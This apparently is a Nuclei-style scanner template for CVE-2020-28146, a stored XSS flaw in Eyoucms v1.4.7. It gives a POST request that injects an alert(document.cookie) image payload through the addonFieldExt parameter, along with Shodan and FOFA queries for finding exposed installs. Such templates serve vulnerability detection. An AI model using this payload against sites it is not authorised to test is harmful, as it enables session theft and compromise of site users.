id: CVE-2020-28146

info:
  name: Eyoucms v1.4.7 Stored XSS via addonfieldext
  author: ProjectDiscoveryAI
  severity: medium
  description: Cross Site Scripting (XSS) vulnerability exists in Eyoucms v1.4.7 and earlier via the addonfieldext parameter.
  impact: |
    Successful exploitation could lead to unauthorized access or data theft.
  remediation: |
    Upgrade Eyoucms to a non-vulnerable version or apply the vendor-supplied patch.
  reference:
    - https://github.com/eyoucms/eyoucms/issues/12
    - https://www.exploit-db.com/exploits/48530
    - https://www.eyoucms.com/ask/list_1_0/4511.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-28146
    cwe-id: CWE-79
    epss-score: 0.0082
    epss-percentile: 0.82511
    cpe: cpe:2.3:a:eyoucms:eyoucms:*:*:*:*:*:*:*:*
  metadata:
    vendor: eyoucms
    product: eyoucms
    shodan-query: http.favicon.hash:"-614262549"
    fofa-query:
      - icon_hash="-614262549"
      - title="eyoucms"

http:
  - method: POST
    path:
      - "{{BaseURL}}/EyouCMS/index.php?m=user&c=UsersRelease&a=article_add"

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
      Referer: "{{BaseURL}}/EyouCMS/index.php?m=user&c=UsersRelease&a=article_add"

    body: |
      title=test&typeid=9&tags=&litpic_inpiut=&addonFieldExt%5Bcontent%5D=111<img src=1 onerror=alert(document.cookie)>&__token__=b90d4bf2356b81f65284238857b91ada
    matchers:
      - type: word
        words:
          - "<img src=1 onerror=alert(document.cookie)>"
        part: body
